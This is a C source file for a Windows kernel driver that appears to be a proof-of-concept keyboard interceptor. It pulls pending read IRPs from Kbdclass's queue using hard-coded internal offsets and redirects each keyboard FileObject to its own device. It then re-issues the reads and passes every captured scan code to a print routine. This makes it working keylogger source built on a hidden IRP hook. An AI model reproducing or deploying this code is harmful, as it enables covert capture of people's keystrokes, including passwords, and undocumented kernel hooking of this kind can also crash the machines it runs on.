
#include "global.h"
#include "kbd.h"

PDEVICE_OBJECT gPocDeviceObject = NULL;

LIST_ENTRY gKbdObjListHead = { 0 };


NTSTATUS
PocDeviceControlOperation(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    NTSTATUS Status = 0;

    PIO_STACK_LOCATION IrpSp = NULL;

    PLIST_ENTRY listEntry = NULL;
    PPOC_KBDCLASS_OBJECT KbdObj = NULL;

    IrpSp = IoGetCurrentIrpStackLocation(Irp);

    listEntry = gKbdObjListHead.Flink;

    while (listEntry != &gKbdObjListHead)
    {
        KbdObj = CONTAINING_RECORD(listEntry, POC_KBDCLASS_OBJECT, ListEntry);

        if (KbdObj->gKbdFileObject == IrpSp->FileObject)
        {
            break;
        }

        listEntry = listEntry->Flink;
    }

    if (NULL == KbdObj)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->KbdObj is null.\n", __FUNCTION__));
        Status = STATUS_INVALID_PARAMETER;
        goto EXIT;
    }

    IoSkipCurrentIrpStackLocation(Irp);

    Status = IoCallDriver(KbdObj->gKbdDeviceObject, Irp);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->IoCallDriver failed. Status = 0x%x.\n",
                __FUNCTION__,
                Status));
    }

EXIT:

    return Status;
}


PIRP
KeyboardClassDequeueRead(
    _In_ PCHAR DeviceExtension
)
/*++

Routine Description:
    Dequeues the next available read irp regardless of FileObject

Assumptions:
    DeviceExtension->SpinLock is already held (so no further sync is required).

  --*/
{
    ASSERT(NULL != DeviceExtension);

    PIRP nextIrp = NULL;

    LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);

    while (!nextIrp && !IsListEmpty(ReadQueue)) {
        PDRIVER_CANCEL oldCancelRoutine;
        PLIST_ENTRY listEntry = RemoveHeadList(ReadQueue);

        //
        // Get the next IRP off the queue and clear the cancel routine
        //
        nextIrp = CONTAINING_RECORD(listEntry, IRP, Tail.Overlay.ListEntry);
        oldCancelRoutine = IoSetCancelRoutine(nextIrp, NULL);

        //
        // IoCancelIrp() could have just been called on this IRP.
        // What we're interested in is not whether IoCancelIrp() was called
        // (ie, nextIrp->Cancel is set), but whether IoCancelIrp() called (or
        // is about to call) our cancel routine. To check that, check the result
        // of the test-and-set macro IoSetCancelRoutine.
        //
        if (oldCancelRoutine) {
            //
                //  Cancel routine not called for this IRP.  Return this IRP.
            //
            /*ASSERT(oldCancelRoutine == KeyboardClassCancel);*/
        }
        else {
            //
                // This IRP was just cancelled and the cancel routine was (or will
            // be) called. The cancel routine will complete this IRP as soon as
            // we drop the spinlock. So don't do anything with the IRP.
            //
                // Also, the cancel routine will try to dequeue the IRP, so make the
            // IRP's listEntry point to itself.
            //
            //ASSERT(nextIrp->Cancel);
            InitializeListHead(&nextIrp->Tail.Overlay.ListEntry);
            nextIrp = NULL;
        }
    }

    return nextIrp;
}


VOID
PocHandleReadThread(
    IN PVOID StartContext
)
{
    ASSERT(NULL != StartContext);

    NTSTATUS Status = 0;

    PIRP Irp = NULL, NewIrp = NULL;
    PIO_STACK_LOCATION IrpSp = NULL, NewIrpSp = NULL;

    PLIST_ENTRY listEntry = NULL;
    PPOC_KBDCLASS_OBJECT KbdObj = NULL;

    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKEYBOARD_INPUT_DATA InputData = NULL;

    Irp = StartContext;

    IrpSp = IoGetCurrentIrpStackLocation(Irp);

    listEntry = gKbdObjListHead.Flink;

    while (listEntry != &gKbdObjListHead)
    {
        KbdObj = CONTAINING_RECORD(listEntry, POC_KBDCLASS_OBJECT, ListEntry);

        if (KbdObj->gKbdFileObject == IrpSp->FileObject)
        {
            break;
        }

        listEntry = listEntry->Flink;
    }

    if (NULL == KbdObj)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->KbdObj is null.\n", __FUNCTION__));
        Status = STATUS_INVALID_PARAMETER;
        goto EXIT;
    }


    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KbdObj->gKbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFET_DE);

    if (Irp == KbdObj->gRemoveLockIrp)
    {
        IoReleaseRemoveLock(RemoveLock, Irp);
        KbdObj->gRemoveLockIrp = NULL;
    }


    NewIrp = IoBuildSynchronousFsdRequest(
        IRP_MJ_READ,
        KbdObj->gKbdDeviceObject,
        Irp->AssociatedIrp.SystemBuffer,
        IrpSp->Parameters.Read.Length,
        &IrpSp->Parameters.Read.ByteOffset,
        &KbdObj->gEvent,
        &Irp->IoStatus);

    if (NULL == NewIrp)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->IoBuildSynchronousFsdRequest NewIrp failed..\n", __FUNCTION__));
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto EXIT;
    }


    KeClearEvent(NewIrp->UserEvent);
    NewIrp->Tail.Overlay.Thread = Irp->Tail.Overlay.Thread;
    NewIrp->Tail.Overlay.AuxiliaryBuffer = NULL;
    NewIrp->RequestorMode = Irp->RequestorMode;
    NewIrp->PendingReturned = FALSE;
    NewIrp->Cancel = FALSE;
    NewIrp->CancelRoutine = NULL;

    /*
    * 这三个域必须置NULL
    */
    NewIrp->Tail.Overlay.OriginalFileObject = NULL;
    NewIrp->Overlay.AsynchronousParameters.UserApcRoutine = NULL;
    NewIrp->Overlay.AsynchronousParameters.UserApcContext = NULL;

    NewIrpSp = IoGetNextIrpStackLocation(NewIrp);
    NewIrpSp->FileObject = KbdObj->gKbdFileObject;
    NewIrpSp->Parameters.Read.Key = IrpSp->Parameters.Read.Key;
    

    Status = IoCallDriver(KbdObj->gKbdDeviceObject, NewIrp);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->IoCallDriver failed. Status = 0x%x.\n",
                __FUNCTION__,
                Status));
    }

    if (STATUS_PENDING == Status)
    {
        KeWaitForSingleObject(
            NewIrp->UserEvent,
            WrUserRequest,
            KernelMode,
            TRUE,
            NULL);
    }


    if (STATUS_SUCCESS == Irp->IoStatus.Status &&
        0 != Irp->IoStatus.Information)
    {
        IrpSp->Parameters.Read.Length = (ULONG)Irp->IoStatus.Information;
        InputData = Irp->AssociatedIrp.SystemBuffer;

        for (InputData;
            (PCHAR)InputData < (PCHAR)Irp->AssociatedIrp.SystemBuffer + Irp->IoStatus.Information;
            InputData++)
        {
            PocPrintScanCode(InputData);
        }

        if (NULL != KbdObj)
        {
            ExEnterCriticalRegionAndAcquireResourceExclusive(&KbdObj->Resource);

            KbdObj->gSafeUnload = TRUE;

            ExReleaseResourceAndLeaveCriticalRegion(&KbdObj->Resource);
        }

        IoCompleteRequest(Irp, IO_KEYBOARD_INCREMENT);
    }
    else
    {
        if (NULL != KbdObj)
        {
            ExEnterCriticalRegionAndAcquireResourceExclusive(&KbdObj->Resource);

            KbdObj->gSafeUnload = TRUE;

            ExReleaseResourceAndLeaveCriticalRegion(&KbdObj->Resource);
        }

        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }


EXIT:

    PsTerminateSystemThread(Status);
}


NTSTATUS
PocReadOperation(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    NTSTATUS Status = 0;

    PIO_STACK_LOCATION IrpSp = NULL;

    PPOC_KBDCLASS_OBJECT KbdObj = NULL;
    PLIST_ENTRY listEntry = NULL;

    HANDLE ThreadHandle = NULL;

    IrpSp = IoGetCurrentIrpStackLocation(Irp);

    if (IrpSp->Parameters.Read.Length == 0) 
    {
        Status = STATUS_SUCCESS;
    }
    else if (IrpSp->Parameters.Read.Length % sizeof(KEYBOARD_INPUT_DATA)) 
    {
        Status = STATUS_BUFFER_TOO_SMALL;
    }
    else 
    {
        //
        // We only allow a trusted subsystem with the appropriate privilege
        // level to execute a Read call.
        //

        Status = STATUS_PENDING;
    }

    //
    // If status is pending, mark the packet pending and start the packet
    // in a cancellable state.  Otherwise, complete the request.
    //

    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    if (Status == STATUS_PENDING) 
    {
        listEntry = gKbdObjListHead.Flink;

        while (listEntry != &gKbdObjListHead)
        {
            KbdObj = CONTAINING_RECORD(listEntry, POC_KBDCLASS_OBJECT, ListEntry);

            if (KbdObj->gKbdFileObject == IrpSp->FileObject)
            {
                ExEnterCriticalRegionAndAcquireResourceExclusive(&KbdObj->Resource);

                KbdObj->gSafeUnload = FALSE;

                ExReleaseResourceAndLeaveCriticalRegion(&KbdObj->Resource);
            }

            listEntry = listEntry->Flink;
        }

        IoMarkIrpPending(Irp);

        Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,
            NULL,
            PocHandleReadThread,
            Irp);
        
        if (!NT_SUCCESS(Status))
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                ("%s->PsCreateSystemThread PocHandleReadThread failed. Status = 0x%x.\n",
                    __FUNCTION__,
                    Status));
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto EXIT;
        }

        if (NULL != ThreadHandle)
        {
            ZwClose(ThreadHandle);
            ThreadHandle = NULL;
        }

        return STATUS_PENDING;
    }
    else 
    {
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }


EXIT:

    return Status;
}


VOID
PocIrpHookInitThread(
    IN PVOID StartContext
)
{
    UNREFERENCED_PARAMETER(StartContext);

    ASSERT(NULL != StartContext);

    NTSTATUS Status = 0;

    PDEVICE_OBJECT KbdDeviceObject = NULL;

    PCHAR KbdDeviceExtension = NULL;
    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKSPIN_LOCK SpinLock = NULL;
    KIRQL Irql = { 0 };

    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpSp = NULL;
    PPOC_KBDCLASS_OBJECT KbdObj = NULL;

    HANDLE ThreadHandle = NULL;

    KbdDeviceObject = StartContext;


    while (NULL != KbdDeviceObject)
    {
        KbdDeviceExtension = KbdDeviceObject->DeviceExtension;
        RemoveLock = (PIO_REMOVE_LOCK)(KbdDeviceExtension + REMOVE_LOCK_OFFET_DE);
        SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

        KbdObj = ExAllocatePoolWithTag(NonPagedPool, sizeof(POC_KBDCLASS_OBJECT), POC_NONPAGED_POOL_TAG);

        if (NULL == KbdObj)
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                ("%s->ExAllocatePoolWithTag KbdObj failed.\n",
                    __FUNCTION__));
            Status = STATUS_INSUFFICIENT_RESOURCES;
            goto EXIT;
        }

        RtlZeroMemory(KbdObj, sizeof(POC_KBDCLASS_OBJECT));


        /*
        * 从Kbdclass的IRP链表DeviceExtension->ReadQueue取出IRP
        */
        while (TRUE)
        {
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KeyboardClassDequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            if (NULL != Irp)
            {
                break;
            }
        }


        IrpSp = IoGetCurrentIrpStackLocation(Irp);

        /*
        * KbdDeviceObject是Kbdclass为每个底层设备分配的的设备对象，
        * gBttmDeviceObject是Kbdclass设备栈最低层的设备对象，通常为PS/2，USB HID键盘
        */
        KbdObj->gSafeUnload = FALSE;
        KbdObj->gRemoveLockIrp = Irp;
        KbdObj->gKbdFileObject = IrpSp->FileObject;
        KbdObj->gBttmDeviceObject = IrpSp->FileObject->DeviceObject;
        KbdObj->gKbdDeviceObject = KbdDeviceObject;

        KeInitializeEvent(&KbdObj->gEvent, SynchronizationEvent, FALSE);
        ExInitializeResourceLite(&KbdObj->Resource);

        /*
        * 替换FileObject->DeviceObject为gPocDeviceObject，
        * 这样Win32k的IRP就会发到我们的Poc驱动
        */

        KbdObj->gKbdFileObject->DeviceObject = gPocDeviceObject;

        gPocDeviceObject->StackSize = max(KbdObj->gBttmDeviceObject->StackSize, gPocDeviceObject->StackSize);
        

        ExInterlockedInsertTailList(
            &gKbdObjListHead,
            &KbdObj->ListEntry,
            &((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjSpinLock);

        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->ExInterlockedInsertTailList gPocDeviceObject = %p gKbdDeviceObject = %p gBttmDeviceObject = %p gKbdFileObject = %p.\n",
                __FUNCTION__,
                gPocDeviceObject,
                KbdObj->gKbdDeviceObject,
                KbdObj->gBttmDeviceObject,
                KbdObj->gKbdFileObject));

        Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,
            NULL,
            PocHandleReadThread,
            Irp);

        if (!NT_SUCCESS(Status))
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                ("%s->PsCreateSystemThread PocHandleReadThread failed. Status = 0x%x.\n",
                    __FUNCTION__,
                    Status));
            Status = STATUS_SUCCESS;
            goto EXIT;
        }

        if (NULL != ThreadHandle)
        {
            ZwClose(ThreadHandle);
            ThreadHandle = NULL;
        }

        KbdDeviceObject = KbdDeviceObject->NextDevice;
    }

    Status = STATUS_SUCCESS;

EXIT:

    if (!NT_SUCCESS(Status) && NULL != KbdObj)
    {
        if (KbdObj->gKbdFileObject->DeviceObject != KbdObj->gBttmDeviceObject)
        {
            KbdObj->gKbdFileObject->DeviceObject = KbdObj->gBttmDeviceObject;
        }

        ExDeleteResourceLite(&KbdObj->Resource);

        if (NULL != KbdObj)
        {
            ExFreePoolWithTag(KbdObj, POC_NONPAGED_POOL_TAG);
            KbdObj = NULL;
        }

        Irp->IoStatus.Status = 0;
        Irp->IoStatus.Information = 0;
        IoReleaseRemoveLock(RemoveLock, Irp);
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }

    PsTerminateSystemThread(Status);
}


NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
/*++

Routine Description:
    DriverEntry initializes the driver and is the first routine called by the
    system after the driver is loaded. DriverEntry specifies the other entry
    points in the function driver, such as EvtDevice and DriverUnload.

Parameters Description:

    DriverObject - represents the instance of the function driver that is loaded
    into memory. DriverEntry must initialize members of DriverObject before it
    returns to the caller. DriverObject is allocated by the system before the
    driver is loaded, and it is released by the system after the system unloads
    the function driver from memory.

    RegistryPath - represents the driver specific path in the Registry.
    The function driver can use the path to store driver related data between
    reboots. The path does not store hardware instance specific data.

Return Value:

    STATUS_SUCCESS if successful,
    STATUS_UNSUCCESSFUL otherwise.

--*/
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS Status = 0;

    UNICODE_STRING DriverName = { 0 };
    PDRIVER_OBJECT KbdDriverObject = NULL;

    HANDLE ThreadHandle = NULL;
    

    RtlInitUnicodeString(&DriverName, L"\\Karlann");

    Status = IoCreateDevice(
        DriverObject,
        sizeof(DEVICE_EXTENSION),
        &DriverName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &gPocDeviceObject);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->IoCreateDevice failed. Status = 0x%x.\n",
                __FUNCTION__, Status));
        goto EXIT;
    }

    /*
    * 使用内存Irp->AssociatedIrp.SystemBuffer
    */
    gPocDeviceObject->Flags |= DO_BUFFERED_IO;


    /*
    * 找到键盘驱动Kbdclass的DeviceObject
    */
    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");

    Status = ObReferenceObjectByName(
        &DriverName,
        OBJ_CASE_INSENSITIVE, 
        NULL, 
        FILE_ALL_ACCESS, 
        *IoDriverObjectType,
        KernelMode, 
        NULL, 
        &KbdDriverObject);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->ObReferenceObjectByName %ws failed. Status = 0x%x.\n", 
                __FUNCTION__, 
                DriverName.Buffer,
                Status));
        goto EXIT;
    }

    InitializeListHead(&gKbdObjListHead);
    KeInitializeSpinLock(&((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjSpinLock);


    DriverObject->MajorFunction[IRP_MJ_READ] = PocReadOperation;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PocDeviceControlOperation;

    DriverObject->DriverUnload = PocUnload;


    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        PocIrpHookInitThread,
        KbdDriverObject->DeviceObject);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PsCreateSystemThread PocIrpHookInitThread failed. Status = 0x%x.\n",
                __FUNCTION__,
                Status));
        goto EXIT;
    }

    if (NULL != ThreadHandle)
    {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }

    
    Status = STATUS_SUCCESS;

EXIT:

    if (!NT_SUCCESS(Status) && NULL != gPocDeviceObject)
    {
        IoDeleteDevice(gPocDeviceObject);
        gPocDeviceObject = NULL;
    }

    if (NULL != KbdDriverObject)
    {
        ObDereferenceObject(KbdDriverObject);
        KbdDriverObject = NULL;
    }

    return Status;
}


VOID
PocKbdObjListCleanup(
)
{
    PPOC_KBDCLASS_OBJECT KbdObj = NULL;
    PLIST_ENTRY listEntry = NULL;

    PCHAR KbdDeviceExtension = NULL;
    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKSPIN_LOCK SpinLock = NULL;
    KIRQL Irql = { 0 };

    PIRP Irp = NULL;

    ULONG ulHundredNanoSecond = 0;
    LARGE_INTEGER Interval = { 0 };

    while (!IsListEmpty(&gKbdObjListHead))
    {
        listEntry = ExInterlockedRemoveHeadList(
            &gKbdObjListHead,
            &((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjSpinLock);

        KbdObj = CONTAINING_RECORD(listEntry, POC_KBDCLASS_OBJECT, ListEntry);
      
        if (KbdObj->gKbdFileObject->DeviceObject != KbdObj->gBttmDeviceObject)
        {
            KbdDeviceExtension = KbdObj->gKbdDeviceObject->DeviceExtension;

            RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KbdObj->gKbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            while (TRUE)
            {
                KeAcquireSpinLock(SpinLock, &Irql);
                Irp = KeyboardClassDequeueRead(KbdDeviceExtension);
                KeReleaseSpinLock(SpinLock, Irql);

                if (NULL != Irp)
                {
                    break;
                }
            }


            KbdObj->gKbdFileObject->DeviceObject = KbdObj->gBttmDeviceObject;

            /*
            * 这个IRP是Poc驱动PocHandleReadThread函数发给Kbdclass的，
            * IoCompleteRequest以后，PocHandleReadThread的KeWaitForSingleObject会结束等待，PocHandleReadThread线程也会退出
            */
            Irp->IoStatus.Status = 0;
            Irp->IoStatus.Information = 0;

            IoReleaseRemoveLock(RemoveLock, Irp);
            IoCompleteRequest(Irp, IO_NO_INCREMENT);


#pragma warning(push)
#pragma warning(disable:4996)
            ulHundredNanoSecond = 10 * 1000 * 1000;
            Interval = RtlConvertLongToLargeInteger(-1 * ulHundredNanoSecond);
#pragma warning(pop)

            while (!KbdObj->gSafeUnload)
            {
                KeDelayExecutionThread(KernelMode, FALSE, &Interval);
            }


            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                ("%s->Safe to unload. gPocDeviceObject = %p gKbdDeviceObject = %p gBttmDeviceObject = %p gKbdFileObject = %p gKbdFileObject->DeviceObject = %p.\n",
                    __FUNCTION__,
                    gPocDeviceObject,
                    KbdObj->gKbdDeviceObject,
                    KbdObj->gBttmDeviceObject,
                    KbdObj->gKbdFileObject,
                    KbdObj->gKbdFileObject->DeviceObject));
        
        }

        ExDeleteResourceLite(&KbdObj->Resource);

        if (NULL != KbdObj)
        {
            ExFreePoolWithTag(KbdObj, POC_NONPAGED_POOL_TAG);
            KbdObj = NULL;
        }
    }
}


VOID 
PocUnload(
    _In_ PDRIVER_OBJECT  DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    PocKbdObjListCleanup();

    if (NULL != gPocDeviceObject)
    {
        IoDeleteDevice(gPocDeviceObject);
        gPocDeviceObject = NULL;
    }
}
